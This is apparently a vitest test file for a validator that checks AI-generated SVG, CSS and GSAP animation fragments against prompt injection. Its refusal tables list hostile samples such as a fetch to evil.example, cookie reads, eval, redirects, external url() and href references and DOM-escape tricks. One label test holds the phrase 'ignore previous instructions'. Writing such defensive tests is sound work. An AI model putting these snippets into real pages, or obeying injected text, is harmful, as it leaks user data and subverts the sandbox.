/**
 * The static half of the bespoke scene contract: what a model-written scene may
 * contain before it is ever built or opened in a browser.
 *
 * Every refusal below is one a prompt-injected paper could ask for; every
 * acceptance is something a real generated scene (spike, 2026-10-07) did.
 */
import { describe, expect, it } from "vitest";
import { cardRow } from "../src/bespoke/cards.js";
import {
  checkCss,
  checkFragment,
  checkMarkup,
  checkScript,
  type Fragment,
  instantiate,
  motionKinds,
  scopedSelector,
} from "../src/bespoke/contract.js";

const GOOD: Fragment = {
  markup: `<svg id="SCENEID-svg" viewBox="0 0 1700 700" width="1700" height="700">
  <defs><marker id="SCENEID-arrow" viewBox="0 0 10 10" refX="5" refY="5"><path d="M0 0L10 5L0 10z" fill="#4cc9f0"/></marker></defs>
  <g id="SCENEID-enc" data-cue="1"><rect id="SCENEID-box" x="100" y="100" width="300" height="160" rx="4" fill="url(#SCENEID-grad)" /></g>
  <g id="SCENEID-flow" data-cue="2"><path id="SCENEID-wire" d="M400 180 L900 180" stroke="#4cc9f0" stroke-width="3" marker-end="url(#SCENEID-arrow)"/></g>
  <text id="SCENEID-lab" x="250" y="180" font-size="44" text-anchor="middle">Encoder</text>
</svg>
<div class="eq" id="SCENEID-eq"><span class="ds-tex">L = L_{RF} + \\eta L_{RA}</span></div>`,
  css: `#SCENEID-g { position: relative; }
#SCENEID .eq { font-size: 48px; color: #e7f1fb; }
#SCENEID-lab, #SCENEID-eq { opacity: 0; }`,
  script: `
    /* PLAN: the wire draws as the narration says "flows". */
    var dots = root.querySelectorAll("#SCENEID .dot");
    gsap.set("#SCENEID-wire", { drawSVG: "0% 0%" });
    gsap.set(["#SCENEID-lab", "#SCENEID-eq"], { opacity: 0 });
    tl.to("#SCENEID-lab", { opacity: 1, duration: 0.5, ease: "power2.out" }, 1.2);
    tl.fromTo("#SCENEID-wire", { drawSVG: "0% 0%" }, { drawSVG: "0% 100%", duration: 1.4, immediateRender: false }, 2.0);
    for (var i = 0; i < 3; i++) {
      tl.to("#SCENEID-dot" + i, { attr: { cx: 400 + i * 120 }, duration: 0.8, repeat: 2 }, 3 + i * 0.3);
    }
    var tones = { a: "#5ec8f2", b: "#f7c948" };
    var k = "a";
    tl.to("#SCENEID-box", { fill: tones[k], duration: 0.4 }, 4);
    tl.to("#SCENEID-eq", { opacity: 1, y: Math.round(Math.sin(0.5) * 10), duration: 0.6 }, 5.5);
    var pts = [0, 1, 2].map(function (j) { return [100 + j * 50, 300 - j * 20].join(","); }).join(" ");
    tl.set("#SCENEID-poly", { attr: { points: pts } }, 6);
  `,
};

describe("a scene that keeps the contract", () => {
  it("passes every static check", () => {
    expect(checkFragment(GOOD)).toEqual([]);
  });

  it("is instantiated by replacing the token everywhere", () => {
    const f = instantiate(GOOD, "s7");
    expect(f.markup).toContain('id="s7-svg"');
    expect(f.css).toContain("#s7-g");
    expect(f.script).toContain('"#s7-wire"');
    expect(f.script).not.toContain("SCENEID");
  });
});

describe("scoping", () => {
  it("accepts the scene id followed by a boundary", () => {
    expect(scopedSelector("#SCENEID")).toBe(true);
    expect(scopedSelector("#SCENEID .x, #SCENEID-y")).toBe(true);
  });
  it("refuses another scene, a bare class, and a longer id with the same prefix", () => {
    expect(scopedSelector(".dot")).toBe(false);
    expect(scopedSelector("#SCENEID .x, body")).toBe(false);
    expect(scopedSelector("#SCENEIDX")).toBe(false);
  });
});

const rules = (findings: { rule: string }[]) => findings.map((f) => f.rule);

describe("the script allowlist", () => {
  const refused: Array<[string, string, string]> = [
    ["network", `fetch("https://evil.example/" + 1);`, "script_name"],
    ["xhr", `var x = XMLHttpRequest;`, "script_name"],
    ["eval", `eval("1+1");`, "script_name"],
    ["Function", `var f = Function("return 1");`, "script_name"],
    ["navigation", `location.href = "https://evil.example";`, "script_name"],
    ["window", `window.top.location = "x";`, "script_name"],
    ["document", `document.cookie;`, "script_name"],
    ["storage", `localStorage.setItem("a", "b");`, "script_name"],
    ["timers", `setTimeout(function () {}, 10);`, "script_name"],
    ["clock", `var t = Date.now();`, "script_name"],
    ["random", `var r = Math.random();`, "script_random"],
    ["gsap random string", `tl.to("#SCENEID-a", { x: "random(0, 100)" }, 1);`, "script_random"],
    [
      "a callback",
      `tl.to("#SCENEID-a", { x: 1, onUpdate: function () {} }, 1);`,
      "script_callback",
    ],
    [
      "a function value",
      `tl.to("#SCENEID-a", { x: function () { return 1; } }, 1);`,
      "script_callback",
    ],
    ["tl.call", `tl.call(function () {}, [], 1);`, "script_api"],
    ["gsap.to off the timeline", `gsap.to("#SCENEID-a", { x: 1 });`, "script_api"],
    ["gsap.from", `gsap.from("#SCENEID-a", { x: 1 });`, "script_api"],
    ["no position", `tl.to("#SCENEID-a", { x: 1 });`, "script_position"],
    ["relative position", `tl.to("#SCENEID-a", { x: 1 }, "+=1");`, "script_position"],
    ["vars by reference", `var v = { x: 1 }; tl.to("#SCENEID-a", v, 1);`, "script_vars"],
    ["unscoped target", `tl.to(".dot", { x: 1 }, 1);`, "script_scope"],
    ["unscoped query", `root.querySelector("body");`, "script_scope"],
    ["infinite repeat", `tl.to("#SCENEID-a", { x: 1, repeat: -1 }, 1);`, "script_repeat"],
    ["new", `var a = new Array(3);`, "script_node"],
    ["this", `var g = this;`, "script_node"],
    ["while", `while (true) {}`, "script_node"],
    ["endless for", `for (;;) {}`, "script_loop"],
    ["innerHTML", `root.querySelector("#SCENEID-a").innerHTML = "<img src=x>";`, "script_name"],
    ["DOM walk out", `var d = root.querySelector("#SCENEID-a").ownerDocument;`, "script_name"],
    [
      "a spelled key",
      `var e = root.querySelector("#SCENEID-a"); var d = e["owner" + "Document"];`,
      "script_computed",
    ],
    ["an undeclared global", `postMessage("x", "*");`, "script_name"],
    ["an unknown global", `var x = someGlobal;`, "script_global"],
    ["shadowing the shell", `var tl = 1;`, "script_shadow"],
    ["writing a shell object", `gsap.foo = 1;`, "script_api"],
    ["a stored callback", `var o = {}; o.f = function () {};`, "script_callback"],
    ["layout reads", `var b = root.querySelector("#SCENEID-a").getBBox();`, "script_name"],
    ["syntax", `tl.to(`, "script_syntax"],
  ];
  for (const [what, script, rule] of refused) {
    it(`refuses ${what}`, () => {
      expect(rules(checkScript(script))).toContain(rule);
    });
  }
});

describe("the stylesheet", () => {
  it("refuses an unscoped rule", () => {
    expect(rules(checkCss(".dot { fill: red; }"))).toContain("css_scope");
  });
  it("refuses at-rules, url(), animation and transition", () => {
    expect(rules(checkCss(`@import "x.css"; #SCENEID { color: red; }`))).toContain("css_forbidden");
    expect(rules(checkCss("#SCENEID { background: url(https://evil.example/a.png); }"))).toContain(
      "css_forbidden",
    );
    expect(rules(checkCss("#SCENEID .a { animation: spin 1s infinite; }"))).toContain(
      "css_forbidden",
    );
    expect(rules(checkCss("#SCENEID .a { transition: opacity 1s; }"))).toContain("css_forbidden");
  });
  it("refuses type under the 40px floor", () => {
    expect(rules(checkCss("#SCENEID .a { font-size: 28px; }"))).toContain("css_type_floor");
  });
  it("allows a reference to the scene's own gradient", () => {
    expect(checkCss("#SCENEID .a { fill: url(#SCENEID-grad); }")).toEqual([]);
  });
});

describe("the markup", () => {
  it("refuses script, iframe, img and foreignObject", () => {
    for (const tag of ["script", "iframe", "img", "foreignObject", "object", "a"]) {
      expect(rules(checkMarkup(`<${tag} id="SCENEID-x"></${tag}>`))).toContain("markup_tag");
    }
  });
  it("admits <image> only as the beat's own illustration, with no href of its own", () => {
    const art = `<image id="SCENEID-pic" data-art="1" x="0" y="0" width="800" height="450"/>`;
    expect(checkMarkup(art, { art: true })).toEqual([]);
    // A beat with no picture cannot place one.
    expect(rules(checkMarkup(art))).toEqual(["markup_art"]);
    // Not without data-art, and never with an href — not even one inside the scene.
    expect(rules(checkMarkup(`<image id="SCENEID-x"/>`, { art: true }))).toContain("markup_art");
    for (const href of ["https://evil.example/x.png", "#SCENEID-a", "data:image/png;base64,AA"])
      expect(rules(checkMarkup(`<image data-art="1" href="${href}"/>`, { art: true }))).toContain(
        "markup_ref",
      );
    expect(rules(checkMarkup(`<image data-art="1" xlink:href="x.png"/>`, { art: true }))).toContain(
      "markup_ref",
    );
    expect(rules(checkMarkup(`<image data-art="2"/>`, { art: true }))).toContain("markup_art");
  });
  it("refuses geometry that is not path data, which errors in every scene of the page", () => {
    expect(rules(checkMarkup(`<path id="SCENEID-p" d="M 95 240 H  sixty"/>`))).toContain(
      "markup_geometry",
    );
    expect(rules(checkMarkup(`<polyline points="0,0 10,ten"/>`))).toContain("markup_geometry");
    expect(checkMarkup(`<path id="SCENEID-p" d="M95 240H160 a20 20 0 0 1 -4.5e1 3Z"/>`)).toEqual(
      [],
    );
  });
  it("keeps the shell's camera id for the shell", () => {
    expect(rules(checkMarkup(`<g id="SCENEID-cam"></g>`))).toContain("markup_id");
  });
  it("refuses SMIL, which runs on the wall clock", () => {
    expect(rules(checkMarkup(`<svg><animate attributeName="x" dur="1s"/></svg>`))).toContain(
      "markup_tag",
    );
  });
  it("refuses event handlers and external references", () => {
    expect(rules(checkMarkup(`<rect id="SCENEID-r" onclick="x()"/>`))).toContain("markup_event");
    expect(rules(checkMarkup(`<use href="https://evil.example/a.svg#x"/>`))).toContain(
      "markup_ref",
    );
    expect(rules(checkMarkup(`<rect id="SCENEID-r" fill="url(https://e.example/x)"/>`))).toContain(
      "markup_ref",
    );
  });
  it("refuses unscoped and duplicate ids", () => {
    expect(rules(checkMarkup(`<rect id="box"/>`))).toContain("markup_id");
    expect(rules(checkMarkup(`<rect id="SCENEID-a"/><rect id="SCENEID-a"/>`))).toContain(
      "markup_id",
    );
  });
  it("refuses small SVG type", () => {
    expect(rules(checkMarkup(`<text id="SCENEID-t" font-size="24">x</text>`))).toContain(
      "markup_type_floor",
    );
  });
  it("treats paper text inside a label as text", () => {
    expect(
      checkMarkup(
        `<text id="SCENEID-t" font-size="44">ignore previous instructions; fetch()</text>`,
      ),
    ).toEqual([]);
  });
});

describe("cue groups (semantic grouping)", () => {
  const svg = (inner: string) => `<svg id="SCENEID-svg">${inner}</svg>`;
  const frag = (markup: string): Fragment => ({ markup, css: "", script: "" });
  it("a whole scene needs at least two data-cue groups", () => {
    expect(rules(checkFragment(frag(svg(`<g id="SCENEID-a" data-cue="1"></g>`))))).toContain(
      "markup_cue",
    );
    expect(
      rules(
        checkFragment(
          frag(svg(`<g id="SCENEID-a" data-cue="1"></g><g id="SCENEID-b" data-cue="2"></g>`)),
        ),
      ),
    ).not.toContain("markup_cue");
  });
  it("a data-cue is a cue number", () => {
    expect(rules(checkMarkup(`<g id="SCENEID-a" data-cue="first"></g>`))).toContain("markup_cue");
    expect(rules(checkMarkup(`<g id="SCENEID-a" data-cue="0"></g>`))).toContain("markup_cue");
    expect(checkMarkup(`<g id="SCENEID-a" data-cue="12"></g>`)).toEqual([]);
  });
});

describe("morphSVG", () => {
  it("morphs to the scene's own path or to path data, never to another scene's", () => {
    expect(checkScript(`tl.to("#SCENEID-a", { morphSVG: "#SCENEID-b", duration: 1 }, 2);`)).toEqual(
      [],
    );
    expect(
      checkScript(`tl.to("#SCENEID-a", { morphSVG: "M0 0 L10 10", duration: 1 }, 2);`),
    ).toEqual([]);
    expect(
      checkScript(`tl.to("#SCENEID-a", { morphSVG: { shape: "#SCENEID-b" }, duration: 1 }, 2);`),
    ).toEqual([]);
    expect(
      rules(checkScript(`tl.to("#SCENEID-a", { morphSVG: "#s3-logo", duration: 1 }, 2);`)),
    ).toContain("script_scope");
    expect(
      rules(checkScript(`var t = "#s3"; tl.to("#SCENEID-a", { morphSVG: t, duration: 1 }, 2);`)),
    ).toContain("script_morph");
  });
});

describe("motion kinds", () => {
  it("reads the verbs a timeline asks for off its tweens", () => {
    const kinds = motionKinds(`
      tl.to("#SCENEID-svg", { attr: { viewBox: "0 0 10 10" }, duration: 1 }, 1);
      tl.to("#SCENEID-n", { textContent: 83, snap: { textContent: 1 }, duration: 1 }, 2);
      tl.to("#SCENEID-a", { morphSVG: "#SCENEID-b", duration: 1 }, 3);
      tl.to("#SCENEID-p", { x: 100, y: 20, duration: 1, repeat: 3 }, 4);
      tl.to("#SCENEID-q", { opacity: 0.3, duration: 1 }, 5);
      tl.to(["#SCENEID-r", "#SCENEID-s"], { scale: 1, stagger: 0.1, duration: 1 }, 6);
      tl.to("#SCENEID-w", { drawSVG: "0% 100%", duration: 1 }, 7);
    `);
    expect(kinds).toEqual([
      "draw",
      "morph",
      "camera",
      "counter",
      "stagger",
      "flow",
      "scale",
      "focus",
    ]);
    expect(motionKinds(`tl.to("#SCENEID-a", { opacity: 1, duration: 1 }, 1);`)).toEqual([]);
    expect(motionKinds("not js (")).toEqual([]);
  });
});

describe("an illustrated scene's staging (round 4)", () => {
  const STAGED: Fragment = {
    markup: `<svg id="SCENEID-svg" width="1700" height="700"><image id="SCENEID-p" data-art="1"/><g id="SCENEID-a" data-cue="1" data-subject="1"><text id="SCENEID-t1">cup</text></g><g id="SCENEID-b" data-cue="2" data-subject="2"><text id="SCENEID-t2">arm</text></g></svg>`,
    css: "",
    script: `tl.to("#SCENEID-a", { opacity: 1, duration: 0.4 }, 1);`,
    shots: [
      { cue: 2, at: 0, subject: 1 },
      { cue: 3, at: 0.2, subject: 2 },
    ],
  };
  const ctx = { art: true, subjects: 3, cues: 4 };
  const rules = (f: Fragment) => checkFragment(f, ctx).map((x) => x.rule);

  it("passes a scene that names its shots (round 6: no labels asked for)", () => {
    expect(checkFragment(STAGED, ctx)).toEqual([]);
  });

  it("refuses a script that moves the shell's camera", () => {
    const moved = {
      ...STAGED,
      script: `${STAGED.script}\ntl.to("#SCENEID-cam", { scale: 1.3, duration: 1 }, 4);`,
    };
    expect(rules(moved)).toEqual(["script_camera"]);
  });

  it("refuses shots that stage fewer than two subjects; drops what is not there instead of failing on it", () => {
    expect(rules({ ...STAGED, shots: [{ cue: 2, at: 0, subject: 1 }] })).toEqual(["shots"]);
    expect(rules({ ...STAGED, shots: [] })).toEqual(["shots"]);
    // A cue or a subject that does not exist, or "at" in seconds: dropped or read as seconds.
    expect(
      rules({
        ...STAGED,
        shots: [
          ...(STAGED.shots ?? []),
          { cue: 9, at: 0, subject: 1 },
          { cue: 2, at: 3.2, subject: 5 },
        ],
      }),
    ).toEqual([]);
    // Two shots that name only missing subjects stage nothing.
    expect(
      rules({
        ...STAGED,
        shots: [
          { cue: 2, at: 0, subject: 7 },
          { cue: 3, at: 0, subject: 8 },
        ],
      }),
    ).toEqual(["shots"]);
  });

  it("refuses a scene's own label group that names no subject of the picture", () => {
    // A scene's own label group must name a real subject.
    const wrong = {
      ...STAGED,
      markup: STAGED.markup.replace('data-subject="2"', 'data-subject="7"'),
    };
    expect(rules(wrong)).toEqual(["markup_subject"]);
  });

  it("asks nothing of a scene with no subjects", () => {
    expect(checkFragment({ ...STAGED, shots: [] }, { art: true })).toEqual([]);
  });
});

describe("card_row: cards, panels or tiles as the main visual", () => {
  const box = { width: 1700, height: 600 };
  const card = (x: number, y: number, w = 360, h = 300) =>
    `<rect x="${x}" y="${y}" width="${w}" height="${h}" rx="24" fill="#222"/>`;
  const svg = (inner: string) =>
    `<svg id="SCENEID-svg" width="1700" height="600" viewBox="0 0 1700 600">${inner}</svg>`;

  it("flags a row of alike cards, a column of panels and a grid of tiles", () => {
    expect(
      cardRow(svg(card(40, 150) + card(460, 150) + card(880, 150) + card(1300, 150)), box),
    ).toMatch(/a row of 4 alike rectangles/);
    const column = svg([0, 1, 2].map((i) => card(600, 20 + i * 190, 500, 160)).join(""));
    expect(cardRow(column, box)).toMatch(/column of 3/);
    const grid = svg(card(100, 40) + card(600, 40) + card(100, 320, 380, 260) + card(600, 320));
    expect(cardRow(grid, box)).toMatch(/grid of 4|row of/);
  });

  it("follows the groups that place the cards", () => {
    const placed = svg(
      [0, 1, 2]
        .map(
          (i) => `<g transform="translate(${60 + i * 540} 140)"><g>${card(0, 0, 400, 320)}</g></g>`,
        )
        .join(""),
    );
    expect(cardRow(placed, box)).toMatch(/row of 3/);
    // Scaled down to chips, the same three are a legend, not the main visual.
    const small = svg(`<g transform="scale(0.2)">${card(0, 0) + card(500, 0) + card(1000, 0)}</g>`);
    expect(cardRow(small, box)).toBeUndefined();
  });

  it("passes a scene built from its content: a ground, a clip rect, a few unlike shapes, small plates", () => {
    const scene = svg(
      `<defs><clipPath id="SCENEID-reveal">${card(0, 0) + card(400, 0) + card(800, 0)}</clipPath></defs>` +
        `<rect x="0" y="0" width="1700" height="600" fill="#111"/>` +
        `<path d="M0 300 L1700 300" stroke="#fff"/>` +
        `<rect x="100" y="60" width="150" height="70" rx="12"/><rect x="600" y="60" width="150" height="70" rx="12"/><rect x="1100" y="60" width="150" height="70" rx="12"/>` +
        card(200, 200, 700, 300) +
        card(1000, 250, 300, 120),
    );
    expect(cardRow(scene, box)).toBeUndefined();
    // Two cards are a comparison, not a template row.
    expect(cardRow(svg(card(100, 150, 600, 300) + card(900, 150, 600, 300)), box)).toBeUndefined();
  });

  it("counts a card drawn twice in one place (a fill and its outline) once", () => {
    const twice = (x: number) =>
      card(x, 150, 600, 300) +
      `<rect x="${x}" y="150" width="600" height="300" rx="24" fill="none" stroke="#fff"/>`;
    expect(cardRow(svg(twice(100) + twice(900)), box)).toBeUndefined();
  });

  it("sees cards placed by a nested <svg>, a rotate(0) or an axis-aligned matrix", () => {
    const nested = svg(
      [0, 1, 2]
        .map(
          (i) =>
            `<svg x="${60 + i * 540}" y="140" width="400" height="320">${card(0, 0, 400, 320)}</svg>`,
        )
        .join(""),
    );
    expect(cardRow(nested, box)).toMatch(/row of 3/);
    // A nested viewBox scales what it holds: 4000 units drawn into 400px.
    const zoomed = svg(
      [0, 1, 2]
        .map(
          (i) =>
            `<svg x="${60 + i * 540}" y="140" width="400" height="320" viewBox="0 0 4000 3200">${card(0, 0, 4000, 3200)}</svg>`,
        )
        .join(""),
    );
    expect(cardRow(zoomed, box)).toMatch(/row of 3/);
    const rotated = svg(
      [0, 1, 2]
        .map(
          (i) =>
            `<g transform="translate(${60 + i * 540} 140) rotate(0)">${card(0, 0, 400, 320)}</g>`,
        )
        .join(""),
    );
    expect(cardRow(rotated, box)).toMatch(/row of 3/);
    const matrix = svg(
      [0, 1, 2]
        .map(
          (i) => `<g transform="matrix(1 0 0 1 ${60 + i * 540} 140)">${card(0, 0, 400, 320)}</g>`,
        )
        .join(""),
    );
    expect(cardRow(matrix, box)).toMatch(/row of 3/);
    // A real rotation is not read: no claim either way.
    const turned = svg(
      [0, 1, 2]
        .map(
          (i) =>
            `<g transform="translate(${60 + i * 540} 140) rotate(30)">${card(0, 0, 400, 320)}</g>`,
        )
        .join(""),
    );
    expect(cardRow(turned, box)).toBeUndefined();
  });

  it("sees <div> cards placed in px, inline or by their #id rule, and not an unpainted wrapper", () => {
    const div = (i: number, style = "") =>
      `<div id="SCENEID-c${i}" style="position:absolute;left:${60 + i * 540}px;top:140px;width:400px;height:320px;${style}"></div>`;
    const inline = `<div id="SCENEID-row">${[0, 1, 2].map((i) => div(i, "background:#223;border-radius:24px")).join("")}</div>`;
    expect(cardRow(inline, box)).toMatch(/row of 3/);
    // Unpainted, the same boxes are layout, not cards.
    expect(cardRow(`<div>${[0, 1, 2].map((i) => div(i)).join("")}</div>`, box)).toBeUndefined();
    const byRule = `<div>${[0, 1, 2].map((i) => `<div id="SCENEID-k${i}"></div>`).join("")}</div>`;
    const css = [0, 1, 2]
      .map(
        (i) =>
          `#SCENEID-k${i} { position: absolute; left: ${60 + i * 540}px; top: 140px; width: 400px; height: 320px; background-color: #223; }`,
      )
      .join("\n");
    expect(cardRow(byRule, box, css)).toMatch(/row of 3/);
    expect(cardRow(byRule, box)).toBeUndefined();
  });
});

describe("quiet type (round 6)", () => {
  const svg = (inner: string) =>
    `<svg id="SCENEID-svg" width="1920" height="1080"><g id="SCENEID-a" data-cue="1">${inner}</g><g id="SCENEID-b" data-cue="2"></g></svg>`;
  const rules = (markup: string, css = "") =>
    checkFragment({ markup, css, script: "" }).map((x) => x.rule);

  it("refuses a font-size over the 56px headline, in markup or css, and keeps the 40px floor", () => {
    expect(rules(svg('<text id="SCENEID-t" font-size="44">a</text>'))).toEqual([]);
    expect(rules(svg('<text id="SCENEID-t" font-size="56">a</text>'))).toEqual([]);
    expect(rules(svg('<text id="SCENEID-t" font-size="64">a</text>'))).toEqual(["type_scale"]);
    expect(rules(svg('<text id="SCENEID-t" font-size="120">a</text>'))).toEqual(["type_scale"]);
    expect(rules(svg('<text id="SCENEID-t" font-size="36">a</text>'))).toEqual([
      "markup_type_floor",
    ]);
    expect(rules(svg(""), "#SCENEID-t{font-size:88px}")).toEqual(["type_scale"]);
  });

  it("asks a scene on a picture for no cue groups: it may add nothing at all", () => {
    const empty = {
      markup: '<svg id="SCENEID-svg" width="1920" height="1080"></svg>',
      css: "",
      script: "",
    };
    expect(checkFragment(empty).map((x) => x.rule)).toContain("markup_cue");
    expect(
      checkFragment(
        {
          ...empty,
          shots: [
            { cue: 1, at: 0.5, subject: 1 },
            { cue: 2, at: 0, subject: 2 },
          ],
        },
        { art: true, subjects: 3, cues: 3 },
      ),
    ).toEqual([]);
  });

  it("keeps the shell's round-6 ids out of a scene's hands", () => {
    for (const id of ["fx", "light", "plate", "plane1", "subj2", "plate-soft"])
      expect(rules(svg(`<circle id="SCENEID-${id}" r="4"/>`))).toContain("markup_id");
    // A scene's own "sN"/"dN" ids stay its own (the references use them).
    for (const id of ["s1", "d2"])
      expect(rules(svg(`<circle id="SCENEID-${id}" r="4"/>`))).not.toContain("markup_id");
  });
});
